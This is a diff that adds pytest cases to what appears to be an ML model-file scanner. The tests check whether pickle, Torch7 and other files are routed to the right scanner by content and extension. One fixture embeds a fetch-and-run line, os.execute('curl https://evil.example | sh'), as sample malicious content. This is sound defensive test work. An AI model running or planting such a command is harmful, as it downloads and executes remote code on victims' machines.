@@ -413,6 +413,31 @@ def test_get_scanner_for_path_routes_raw_pickle_torch_suffixes_to_pickle(
     _assert_scanner_for_path(model_path, expected_scanner_name)
 
 
+@pytest.mark.parametrize("protocol", [1, 4])
+def test_get_scanner_for_path_keeps_torch_marker_pickle_on_pickle_scanner(tmp_path: Path, protocol: int) -> None:
+    model_path = tmp_path / "marker-checkpoint.pt"
+    model_path.write_bytes(pickle.dumps({"weights": b"\x00torch.FloatTensor nn.Sequential"}, protocol=protocol))
+
+    _assert_scanner_for_path(model_path, "pickle")
+
+
+def test_get_scanner_for_path_keeps_pickle_with_appended_ascii_torch7_header_on_pickle_scanner(tmp_path: Path) -> None:
+    model_path = tmp_path / "appended-header.pt"
+    model_path.write_bytes(
+        pickle.dumps({"weights": [1, 2, 3]}, protocol=4)
+        + b"4\n1\n3\nV 1\n13\nnn.Sequential\n4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+    )
+
+    _assert_scanner_for_path(model_path, "pickle")
+
+
+def test_get_scanner_for_path_routes_marker_form_torch7_pt_to_torch7(tmp_path: Path) -> None:
+    model_path = tmp_path / "marker-checkpoint.pt"
+    model_path.write_bytes(b"\x01\x00torch.FloatTensor nn.Sequential os.execute('curl https://evil.example | sh')\n")
+
+    _assert_scanner_for_path(model_path, "torch7")
+
+
 def test_get_scanner_for_path_routes_raw_bin_payload_to_pytorch_binary(tmp_path: Path) -> None:
     model_path = tmp_path / "model.bin"
     model_path.write_bytes(b"\x00" * 128)
@@ -574,6 +599,28 @@ def test_get_scanner_for_path_routes_extensionless_readme_to_metadata_scanner(tm
     readme_path.write_text("# Model Card\n\nSafe documentation.\n")
 
     _assert_scanner_for_path(readme_path, "metadata")
+
+
+def test_get_scanner_for_path_routes_misnamed_torch7_by_content(tmp_path: Path) -> None:
+    torch7_path = tmp_path / "payload.jpg"
+    torch7_path.write_bytes(b"4\n1\n3\nV 1\n13\nnn.Sequential\n4\n2\n3\nV 1\n17\ntorch.FloatTensor\n")
+
+    _assert_scanner_for_path(torch7_path, "torch7")
+
+
+@pytest.mark.parametrize("filename", ["payload.onnx", "payload.pt", "payload.gz", "payload.tar.gz"])
+def test_get_scanner_for_path_prioritizes_torch7_over_recognized_suffix(tmp_path: Path, filename: str) -> None:
+    torch7_path = tmp_path / filename
+    torch7_path.write_bytes(b"4\n1\n3\nV 1\n13\nnn.Sequential\n4\n2\n3\nV 1\n17\ntorch.FloatTensor\n")
+
+    _assert_scanner_for_path(torch7_path, "torch7")
+
+
+def test_get_scanner_for_path_does_not_route_misnamed_torch_source_text(tmp_path: Path) -> None:
+    source_path = tmp_path / "source.jpg"
+    source_path.write_text("import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n")
+
+    assert ScannerRegistry().get_scanner_for_path(str(source_path)) is None
 
 
 def test_get_scanner_for_path_routes_extensionless_llamafile(tmp_path: Path) -> None:
